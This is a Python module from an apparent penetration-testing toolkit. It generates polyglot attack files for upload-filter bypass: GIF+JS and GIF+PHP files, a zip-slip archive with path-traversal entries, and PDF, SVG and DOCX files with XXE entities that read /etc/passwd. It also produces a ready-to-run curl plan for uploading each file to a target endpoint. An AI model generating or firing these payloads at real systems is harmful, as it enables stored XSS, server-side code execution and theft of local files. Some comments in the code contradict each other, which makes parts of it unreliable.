"""
PolyglotLab v1 — file-format polyglot weapons lab for VANTHEX. AUTHORIZED TESTING ONLY.

A generator-only library (no network, no file execution): every generator
returns (bytes, info_dict) where info_dict carries {name, mime, polyglot_type,
detection_evasion_notes, how_to_test}. Callers write the bytes wherever they
want (the lab never opens files or executes anything). All payloads are
non-destructive probe markers — the point is to test upload filters, never to
drop working malware.

validate_polyglot() is the self-test: it checks that a generated blob really
starts with the expected magic bytes (the definition of a polyglot is that the
format parser accepts it).
"""
import io
import os
import re
import zipfile

try:
    from exploitkit import _F as F
except Exception:  # standalone: minimal finding factory fallback
    def F(sev, title, desc, evidence="", cwe="", owasp="", cvss=0.0,
          remed="", confidence="probable", location="", param="",
          verification=None, verification_note=""):
        return {"severity": sev, "title": title, "description": desc,
                "evidence": evidence, "cwe": cwe, "owasp": owasp,
                "cvss": cvss, "remediation": remed,
                "confidence": confidence, "location": location,
                "param": param, "verification": verification or "manual"}

MARKER_TOKEN = "PTKMK"

# ============================================================ magic table

MAGICS = {
    "gif": (b"GIF89a", "image/gif"),
    "zip": (b"PK\x03\x04", "application/zip"),
    "jar": (b"PK\x03\x04", "application/java-archive"),
    "pdf": (b"%PDF-1.", "application/pdf"),
    "svg": (b"<?xml version=\"1.0\"", "image/svg+xml"),
    "docx": (b"PK\x03\x04",
             "application/vnd.openxmlformats-officedocument.wordprocessingml.document"),
}


def _info(name, mime, polyglot_type, evasion, how_to_test):
    return {"name": name, "mime": mime, "polyglot_type": polyglot_type,
            "detection_evasion_notes": evasion, "how_to_test": how_to_test}


# ============================================================ generators

def gif_js(marker=MARKER_TOKEN):
    """GIF89a + trailing <script> markup — image that is also HTML/JS when
    served inline."""
    mk = str(marker)
    # a minimal but genuinely valid 1x1 GIF89a (87-byte canonical GIF)
    gif = base64_gif()
    body = (b"\n<html><body><script>alert('" + mk.encode() +
            b"')</script></body></html>")
    data = gif + body
    info = _info(
        "gif_js", "image/gif", "GIF+HTML/JS polyglot",
        "magic bytes are a fully valid GIF89a so image sniffers and `file` "
        "report an image; the payload lives after the image EOI marker where "
        "most content filters stop scanning",
        "Upload with a .gif name; then request the stored file URL directly "
        "from a browser — if it renders as HTML/JS (server does not force "
        "image Content-Type or nosniff), the marker fires.")
    return data, info


def base64_gif():
    """Canonical 1x1 transparent GIF89a (43 bytes, hand-assembled)."""
    import base64
    return base64.b64decode(
        "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==")


def zip_jar(marker=MANIFEST_MARKER if False else MARKER_TOKEN):
    """ZIP with a META-INF/MANIFEST.MF entry — a plain zip that also parses
    as a Java JAR."""
    mk = str(marker)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("META-INF/MANIFEST.MF",
                   "Manifest-Version: 1.0\r\n"
                   f"Created-By: PTK-PolyglotLab\r\nX-Probe: {mk}\r\n")
        z.writestr("probe.txt", f"PTK-JAR-PROBE-{mk}\n")
    data = buf.getvalue()
    info = _info(
        "zip_jar", "application/java-archive", "ZIP+JAR polyglot",
        "byte-identical structure to a normal zip; the manifest entry is the "
        "only thing that upgrades it to a JAR, so extension/zip-content "
        "filters that whitelist archives pass it unchanged",
        "Upload as .zip or .jar where archives are allowed; if the backend "
        "unpacks jars (e.g. WAR deploy, jar whitelists) the manifest marker "
        "X-Probe shows the entry was parsed.")
    return data, info


def _pdf_header():
    return (b"%PDF-1.4\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]>>endobj\n")


def pdf_ejs(marker=MARKER_TOKEN):
    """Valid PDF whose JavaScript action embeds an EJS/JS template payload —
    'EJS in PDF' (server-side JS in rendered PDF pipelines)."""
    mk = str(marker)
    js = (f"app.alert('{mk}');".encode())
    data = (_pdf_header() +
            b"4 0 obj<</Type/Action/S/JavaScript/JS(" + js + b")>>endobj\n"
            b"trailer<</Root 1 0 R/Size 5>>\n%%EOF\n")
    info = _info(
        "pdf_ejs", "application/pdf", "PDF+EJS/JS polyglot",
        "valid header/xref-less PDF that viewers accept; JS is in a standard "
        "/JavaScript action so PDF content filters that scan text rarely flag "
        "the object syntax",
        "Upload as .pdf; open in a viewer or a server-side PDF pipeline "
        "(converters, form processors) — check whether the JS/EJS template "
        "expression is evaluated or surfaced.")
    return data, info


def pdf_xxe(marker=MARKER_TOKEN):
    """Valid PDF with an XML metadata object carrying an external entity
    payload (XMP-side XXE in PDF parsers)."""
    mk = str(marker)
    xml = (f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM '
           f'"file:///etc/passwd">]><x:xmpmeta xmlns:x="adobe:ns:meta/">'
           f'<x-probe>{mk}</x-probe>&xxe;</x:xmpmeta>').encode()
    data = (_pdf_header() +
            b"4 0 obj<</Type/Metadata/Subtype/XML/Length " +
            str(len(xml)).encode() + b">>stream\n" + xml +
            b"\nendstream endobj\ntrailer<</Root 1 0 R/Size 5>>\n%%EOF\n")
    info = _info(
        "pdf_xxe", "application/pdf", "PDF+XXE polyglot",
        "the XML entity lives inside a PDF metadata stream — library-level "
        "PDF validators see a normal document, while the XML parser inside "
        "metadata-processing code resolves the entity",
        "Upload as .pdf to pipelines that parse PDF metadata (DMS, "
        "converters); an XXE response/error containing the passwd fingerprint "
        "confirms the entity was resolved.")
    return data, info


def zip_slip(marker=MARKER_TOKEN):
    """ZIP whose entry names carry ../ path traversal (Zip Slip)."""
    mk = str(marker)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("../../../../tmp/ptk-zipslip-" + mk + ".txt",
                   f"PTK-ZIPSLIP-{mk}\n")
        z.writestr("benign.txt", f"PTK-BENIGN-{mk}\n")
    data = buf.getvalue()
    info = _info(
        "zip_slip", "application/zip", "zip-slip traversal archive",
        "archives with traversal entry names pass generic zip validation "
        "(the central directory is well-formed); only extraction-path "
        "sanitizers catch them",
        "Upload the archive where extraction happens server-side (import "
        "features, avatar/theme uploads); watch for errors mentioning the "
        "traversal name or a file landing outside the extract dir.")
    return data, info


def svg_xxe(marker=MARKER_TOKEN):
    """SVG image with an external entity in the DTD (XXE via image upload)."""
    mk = str(marker)
    data = ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
            f'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
            f'<text x="0" y="8">&xxe;<!-- {mk} --></text></svg>\n').encode()
    info = _info(
        "svg_xxe", "image/svg+xml", "SVG+XXE polyglot",
        "starts with the XML declaration SVG parsers expect; entity payload "
        "is inside the DOCTYPE, so naive regex filters looking for <script> "
        "pass it",
        "Upload as .svg to image-processing backends (thumbnailing, "
        "librsvg/ImageMagick pipelines); passwd content in the rendered image "
        "or error output confirms XXE.")
    return data, info


def gif_php(marker=MARKER_TOKEN):
    """GIF header followed by a PHP tag — the classic 'GIF+PHP' bypass."""
    mk = str(marker)
    data = base64_gif() + f"\n<?php echo 'PTK-GIFPHP-{mk}'; ?>\n".encode()
    info = _info(
        "gif_php", "image/gif", "GIF+PHP polyglot",
        "getimagesize()/GD see a valid GIF because the header + trailer are "
        "real; the PHP payload after the image data only executes if the "
        "server includes/renames the file with a .php extension",
        "Upload with a .gif name into an app that keeps the original name or "
        "lets you control the stored extension; then fetch the stored path — "
        "echoed marker means the PHP tag executed.")
    return data, info


def docx_xxe(marker=MARKER_TOKEN):
    """DOCX (OOXML zip) with an external entity in a part the docx parsers
    read (core.xml / content types) — macro-less XXE."""
    mk = str(marker)
    core = (f'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
            f'<!DOCTYPE cp:coreProperties [<!ENTITY xxe SYSTEM '
            f'"file:///etc/passwd">]>\n'
            f'<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/'
            f'package/2006/metadata/core-properties">'
            f'<dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">'
            f'PTK-DOCX-{mk} &xxe;</dc:title></cp:coreProperties>').encode()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?>'
                   '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
                   'content-types"><Default Extension="xml" ContentType='
                   '"application/xml"/></Types>')
        z.writestr("docProps/core.xml", core)
        z.writestr("word/document.xml",
                   '<?xml version="1.0"?><w:document xmlns:w="http://schemas.'
                   'openxmlformats.org/wordprocessingml/2006/main">'
                   f'<w:body><w:p>PTK-DOCX-{mk}</w:p></w:body></w:document>')
    data = buf.getvalue()
    info = _info(
        "docx_xxe", DOCX_MIME, "macro-less DOCX XXE",
        "no VBA/macro stream at all — macro filters are irrelevant; the "
        "entity sits in docProps/core.xml which document-metadata readers "
        "parse with a plain XML parser",
        "Upload as .docx to converters/preview services; passwd content in a "
        "document property, an error message, or a callback confirms the "
        "entity resolved.")
    return data, info


DOCX_MIME = ("application/vnd.openxmlformats-officedocument."
             "wordprocessingml.document")
MANIFEST_MARKER = "PTKMK"


GENERATORS = {
    "gif_js": gif_js,
    "zip_jar": zip_jar,
    "pdf_ejs": pdf_ejs,
    "pdf_xxe": pdf_xxe,
    "zip_slip": zip_slip,
    "svg_xxe": svg_xxe,
    "gif_php": gif_php,
    "docx_xxe": docx_xxe,
}

# expected leading magic per generator (for validate_polyglot)
GEN_MAGIC = {
    "gif_js": MAGICS["gif"],
    "zip_jar": MAGICS["jar"],
    "pdf_ejs": MAGICS["pdf"],
    "pdf_xxe": MAGICS["pdf"],
    "zip_slip": MAGICS["zip"],
    "svg_xxe": MAGICS["svg"],
    "gif_php": MAGICS["gif"],
    "docx_xxe": MAGICS["docx"],
}


def generate(kind, marker=MARKER_TOKEN):
    """Uniform generator: kind -> (bytes, info). Unknown kind -> ValueError."""
    if kind not in GENERATORS:
        raise ValueError(f"unknown polyglot: {kind} "
                         f"(valid: {', '.join(sorted(GENERATORS))})")
    return GENERATORS[kind](marker=marker)


# ============================================================ validator

def validate_polyglot(data, magic_expect):
    """Verify a blob really starts with the expected magic bytes.

    magic_expect: bytes, or a (bytes, mime) pair from MAGICS.
    Returns dict {ok, magic_expect, magic_actual, detail}.
    """
    if isinstance(magic_expect, (tuple, list)):
        magic_expect = magic_expect[0]
    magic_expect = bytes(magic_expect)
    data = bytes(data or b"")
    ok = data.startswith(magic_expect)
    return {"ok": ok,
            "magic_expect": magic_expect.decode("latin-1"),
            "magic_actual": data[:len(magic_expect)].decode("latin-1"),
            "detail": ("header matches expected magic" if ok else
                       f"header mismatch: expected {magic_expect!r}")}


def validate_all(marker=MARKER_TOKEN):
    """Run validate_polyglot over every generator. Returns {kind: result}."""
    return {kind: validate_polyglot(*generate(kind, marker)[:1],
                                    GEN_MAGIC[kind])
            for kind in sorted(GENERATORS)}


# ============================================================ upload probe plan

def upload_probe_plan(finding_context="upload endpoint", marker=MARKER_TOKEN,
                      out_dir="PTK_POLYGLOT_OUT"):
    """Copy-paste curl plan (manual_check-style, never executed) for testing
    each polyglot against an upload endpoint: multipart form, filename
    variants, content-type overrides. All outputs go to the operator's dir."""
    mk = str(marker)
    steps = [
        f"# Polyglot upload probe plan — context: {finding_context}",
        f"# Write every generated file into ./{out_dir} first (lab is "
        f"generator-only and never executes):",
        "",
        "python3 - <<'PY'",
        "import pathlib, sys",
        "sys.path.insert(0, '.')",
        "from offensive import polyglotlab",
        f"out = pathlib.Path('{out_dir}'); out.mkdir(exist_ok=True)",
        "for kind in polyglotlab.GENERATORS:",
        "    data, info = polyglotlab.generate(kind)",
        f"    (out / (kind + '.bin')).write_bytes(data)",
        "    print(kind, '->', out / (kind + '.bin'), info['mime'])",
        "PY",
        "",
        "# 0. baseline: confirm the endpoint accepts a plain file",
        f"curl -sv -F 'file=@./{out_dir}/zip_slip.bin;filename=ptk-{mk}.txt' \\",
        "    -F 'submit=1' 'https://TARGET/upload'",
        "",
        "# 1. GIF+JS — try inline render back",
        f"curl -s -F 'file=@./{out_dir}/gif_js.bin;filename=ptk-{mk}.gif;type=image/gif' \\",
        "    'https://TARGET/upload'",
        "# then GET the stored file URL in a browser; alert marker = stored XSS via upload",
        "",
        "# 2. GIF+PHP — content-type override + .php double-extension name",
        f"curl -s -F 'file=@./{out_dir}/gif_php.bin;filename=ptk-{mk}.php.gif;type=image/gif' \\",
        "    'https://TARGET/upload'",
        f"# repeat with filename=ptk-{mk}.gif.php, and type=application/x-php",
        "",
        "# 3. ZIP+JAR — archive whitelists",
        f"curl -s -F 'file=@./{out_dir}/zip_jar.bin;filename=ptk-{mk}.jar;type=application/java-archive' \\",
        "    'https://TARGET/upload'",
        "",
        "# 4. zip-slip — extraction-side traversal",
        f"curl -s -F 'file=@./{out_dir}/zip_slip.bin;filename=ptk-{mk}.zip;type=application/zip' \\",
        "    'https://TARGET/upload'",
        "# watch extraction responses for ../../..//tmp/ptk-zipslip paths",
        "",
        "# 5. PDF+EJS and 6. PDF+XXE — metadata pipelines",
        f"curl -s -F 'file=@./{out_dir}/pdf_ejs.bin;filename=ptk-{mk}.pdf;type=application/pdf' \\",
        "    'https://TARGET/upload'",
        f"curl -s -F 'file=@./{out_dir}/pdf_xxe.bin;filename=ptk-{mk}.pdf;type=application/pdf' \\",
        "    'https://TARGET/upload'",
        "",
        "# 7. SVG+XXE — image converters",
        f"curl -s -F 'file=@./{out_dir}/svg_xxe.bin;filename=ptk-{mk}.svg;type=image/svg+xml' \\",
        "    'https://TARGET/upload'",
        "",
        "# 8. DOCX macro-less XXE — document preview/convert services",
        f"curl -s -F 'file=@./{out_dir}/docx_xxe.bin;filename=ptk-{mk}.docx;type={DOCX_MIME}' \\",
        "    'https://TARGET/upload'",
        "",
        "# verify all outputs really carry the right magic before sending:",
        "python3 -c \"import sys; from offensive import polyglotlab; sys.path.insert(0,'.'); "
        "[print(k, r['ok']) for k, r in polyglotlab.validate_all().items()]\"",
    ]
    return "\n".join(steps)


# ============================================================ scan check

_UPLOAD_RE = re.compile(
    r"<input[^>]+type\s*=\s*[\"']?file|/upload|enctype\s*=\s*[\"']?"
    r"multipart/form-data", re.I)


def _surface_text(ctx):
    """Best-effort textual surface snapshot (forms, homepage body, upload
    paths); falls back to a plain string surface or ctx.html fixture."""
    chunks = []
    try:
        surf = ctx.surface(full=True)
    except Exception:
        surf = None
    if surf is not None:
        body = getattr(getattr(surf, "homepage", None), "body", "") or ""
        chunks.append(body)
        for f in (getattr(surf, "forms", None) or []):
            chunks.append(str(f))
        for pq in (getattr(surf, "param_urls", None) or []):
            chunks.append(str(pq))
    txt = getattr(ctx, "html", None)
    if isinstance(txt, str):
        chunks.append(txt)
    if not chunks and isinstance(ctx, str):
        chunks.append(ctx)
    return "\n".join(chunks)


def c_polyglot(ctx, add):
    """Static upload-surface check, gated by PTK_POLYGLOT=1 (or opts
    polyglot=1): if the crawled surface shows upload endpoints (file input or
    /upload paths), emit probable 'polyglot test plan available' findings —
    verification is manual, evidence is the curl plan. Capped at 4."""
    if os.environ.get("PTK_POLYGLOT") != "1" and \
            not (ctx.opts or {}).get("polyglot"):
        return
    text = _surface_text(ctx)
    if not text or not _UPLOAD_RE.search(text):
        return
    plan = upload_probe_plan(finding_context=ctx.target if hasattr(
        ctx, "target") else "upload endpoint", marker=getattr(
        ctx, "marker", MARKER_TOKEN) or MARKER_TOKEN)
    add(F("MEDIUM", "Upload endpoint accepts files — polyglot test plan available",
          "The surface exposes a file-upload endpoint (file input or /upload "
          "path). PolyglotLab generated a copy-paste curl plan (GIF+JS, "
          "GIF+PHP, ZIP+JAR, zip-slip, PDF+EJS, PDF+XXE, SVG+XXE, DOCX XXE) "
          "to test whether upload filters can be bypassed with "
          "format-polyglot files. No file was uploaded by the engine.",
          evidence=plan, cwe="CWE-434",
          owasp="A05:2021 Security Misconfiguration", cvss=5.3,
          remed="Enforce extension + server-side MIME sniffing whitelists, "
                "serve uploads with Content-Type: application/octet-stream "
                "and nosniff, sanitize archive entry paths, disable external "
                "entities in XML/document parsers.",
          confidence="probable", location="/upload",
          verification="manual",
          verification_note="Requires a human to run the curl plan against "
                            "the endpoint; the engine never uploads files."))
